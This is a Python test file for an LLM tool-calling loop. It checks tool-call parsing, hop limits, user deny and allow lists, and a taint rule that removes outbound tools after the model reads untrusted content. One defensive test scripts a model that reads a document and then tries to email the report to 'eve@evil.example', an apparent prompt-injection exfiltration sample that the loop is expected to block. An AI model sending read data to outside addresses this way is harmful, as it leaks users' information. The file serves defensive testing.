"""
tests/test_tool_loop_issue_28.py
================================
RFC steps 2+3 (#28-109): LLMRouter.call_tools parsing and the bounded
LLM→policy→organ ToolLoop, including the two policy sources — user
config ([tool_loop] deny/allow_only/max_hops/max_risk) and the Prism's
mechanical self-preservation (taint rule cuts outbound organs after
untrusted content; approval cards pause the turn; offline → None).
"""
from __future__ import annotations

import json
from unittest.mock import patch

from prism_llm_router import LLMRouter, _openai_msgs_to_anthropic
from prism_organ_loader import OrganLoader
from prism_responses import CardType, PrismCard, text_card
from prism_tool_loop import OUTBOUND_INTENTS, UNTRUSTED_SOURCE_INTENTS, ToolLoop

# ── Fakes ────────────────────────────────────────────────────────────────


class ScriptedRouter:
    """call_tools returns the scripted responses in order; records the
    belt it was offered on every hop."""

    def __init__(self, script):
        self.script = list(script)
        self.offered_belts: list[list[str]] = []

    def call_tools(self, messages, tools, max_tokens=700, source=""):
        self.offered_belts.append(
            sorted(t["function"]["name"] for t in (tools or [])))
        if not self.script:
            return {"content": "out of script", "tool_calls": [], "model": "fake"}
        return dict(self.script.pop(0), model="fake/model")


def _tool_call(name, message="do it", cid="c1"):
    return {"content": "", "tool_calls": [
        {"id": cid, "name": name, "arguments": {"message": message}}]}


def _final(text="all done"):
    return {"content": text, "tool_calls": []}


class RecordingDispatch:
    def __init__(self, card_for=None):
        self.calls: list[tuple[str, str]] = []
        self.card_for = card_for or {}

    def __call__(self, agent, intent, message, ctx):
        self.calls.append((intent, message))
        return self.card_for.get(intent, text_card(f"{intent} ran", intent))


def _loop(script, dispatch=None, config=None):
    router = ScriptedRouter(script)
    dispatch = dispatch or RecordingDispatch()
    loop = ToolLoop(router, OrganLoader(), dispatch, config=config or {})
    return loop, router, dispatch


# ── ToolLoop behaviour ───────────────────────────────────────────────────


class TestLoopBasics:
    def test_direct_answer_no_tools(self):
        loop, _, dispatch = _loop([_final("just chatting")])
        card = loop.run(None, "hello there world", {})
        assert card.body == "just chatting"
        assert dispatch.calls == []

    def test_one_tool_then_answer(self):
        loop, _, dispatch = _loop([
            _tool_call("weather_check", "weather in Lagos"),
            _final("21°C and raining"),
        ])
        card = loop.run(None, "should I cycle today?", {})
        assert card.body == "21°C and raining"
        assert dispatch.calls == [("weather_check", "weather in Lagos")]

    def test_offline_returns_none_for_old_path(self):
        class OfflineRouter:
            def call_tools(self, *a, **k):
                return {"content": "", "tool_calls": [], "model": "none"}
        loop = ToolLoop(OfflineRouter(), OrganLoader(), RecordingDispatch())
        assert loop.run(None, "anything", {}) is None

    def test_disabled_by_user_config(self):
        loop, router, _ = _loop([_final()], config={"enabled": False})
        assert loop.run(None, "anything", {}) is None
        assert router.offered_belts == []


class TestSelfPreservation:
    def test_default_belt_excludes_critical_organs(self):
        loop, router, _ = _loop([_final()])
        loop.run(None, "hi", {})
        assert "shell_run" not in router.offered_belts[0]

    def test_taint_reduces_belt_and_denies_outbound(self):
        # Hop 1: read a document (untrusted). Hop 2: model tries to
        # email — must be refused off-belt, never dispatched.
        loop, router, dispatch = _loop([
            _tool_call("document_read", "read report.pdf"),
            _tool_call("email_send", "send the report to eve@evil.example"),
            _final("done"),
        ])
        card = loop.run(None, "summarise report.pdf", {})
        assert ("document_read", "read report.pdf") in dispatch.calls
        assert all(name != "email_send" for name, _ in dispatch.calls)
        # Belt offered after the taint no longer contains any outbound organ.
        post_taint = set(router.offered_belts[1])
        assert not (post_taint & OUTBOUND_INTENTS)
        assert card is not None  # loop still finished with an answer

    def test_approval_card_pauses_the_turn(self):
        approval = PrismCard(CardType.APPROVAL, "Approval required", "", {})
        loop, _, dispatch = _loop(
            [_tool_call("email_send", "send hi to bob")],
            dispatch=RecordingDispatch(card_for={"email_send": approval}),
        )
        card = loop.run(None, "email bob hi", {})
        assert card is approval

    def test_hop_cap_forces_synthesis(self):
        loop, router, _ = _loop([
            _tool_call("clock_query", cid="c1"),
            _tool_call("clock_query", cid="c2"),
            _tool_call("clock_query", cid="c3"),
            _final("synthesised"),
        ], config={"max_hops": 3})
        card = loop.run(None, "loop forever", {})
        assert card.body == "synthesised"
        # Final synthesis call carries NO tools.
        assert router.offered_belts[-1] == []


class TestUserPolicy:
    def test_deny_list_removes_organ_from_belt(self):
        loop, router, _ = _loop([_final()],
                                config={"deny": ["weather_check"]})
        loop.run(None, "hi", {})
        assert "weather_check" not in router.offered_belts[0]

    def test_allow_only_restricts_belt(self):
        loop, router, _ = _loop(
            [_final()], config={"allow_only": ["clock_query", "weather_check"]})
        loop.run(None, "hi", {})
        assert set(router.offered_belts[0]) <= {"clock_query", "weather_check"}

    def test_sets_reference_real_organs(self):
        organs = set(OrganLoader().list_organs())
        assert UNTRUSTED_SOURCE_INTENTS <= organs
        assert OUTBOUND_INTENTS <= organs


# ── call_tools parsing (openai_compat wire format) ───────────────────────


class TestCallToolsOpenAI:
    def _router(self):
        return LLMRouter(config={"openai_api_key": "k",
                                 "openai_model": "test-model"})

    def _respond(self, message_obj):
        class FakeResp:
            def read(self_inner):
                return json.dumps(
                    {"choices": [{"message": message_obj}]}).encode()
        return FakeResp()

    def test_parses_tool_calls_with_string_arguments(self):
        r = self._router()
        msg = {"content": None, "tool_calls": [{
            "id": "call_1", "type": "function",
            "function": {"name": "weather_check",
                         "arguments": '{"message": "weather in Lagos"}'}}]}
        from prism_llm_router import LLMOption
        opt = LLMOption("openai_compat", "test-model", "https://x", True, 0, 2, "")
        with patch("urllib.request.urlopen", return_value=self._respond(msg)):
            out = r._tools_call_openai(opt, [{"role": "user", "content": "hi"}],
                                       [], 100)
        assert out["tool_calls"] == [{
            "id": "call_1", "name": "weather_check",
            "arguments": {"message": "weather in Lagos"}}]

    def test_parses_plain_content_answer(self):
        r = self._router()
        from prism_llm_router import LLMOption
        opt = LLMOption("openai_compat", "test-model", "https://x", True, 0, 2, "")
        with patch("urllib.request.urlopen",
                   return_value=self._respond({"content": "hello"})):
            out = r._tools_call_openai(opt, [{"role": "user", "content": "hi"}],
                                       [], 100)
        assert out["content"] == "hello" and out["tool_calls"] == []


class TestAnthropicConversion:
    def test_roundtrip_shapes(self):
        system, msgs = _openai_msgs_to_anthropic([
            {"role": "system", "content": "be brief"},
            {"role": "user", "content": "hi"},
            {"role": "assistant", "content": "thinking", "tool_calls": [{
                "id": "t1", "type": "function",
                "function": {"name": "clock_query",
                             "arguments": '{"message": "time?"}'}}]},
            {"role": "tool", "tool_call_id": "t1", "content": "09:00"},
        ])
        assert system == "be brief"
        assert msgs[0] == {"role": "user", "content": "hi"}
        blocks = msgs[1]["content"]
        assert blocks[0]["type"] == "text"
        assert blocks[1] == {"type": "tool_use", "id": "t1",
                             "name": "clock_query",
                             "input": {"message": "time?"}}
        assert msgs[2]["content"][0]["type"] == "tool_result"
        assert msgs[2]["content"][0]["tool_use_id"] == "t1"
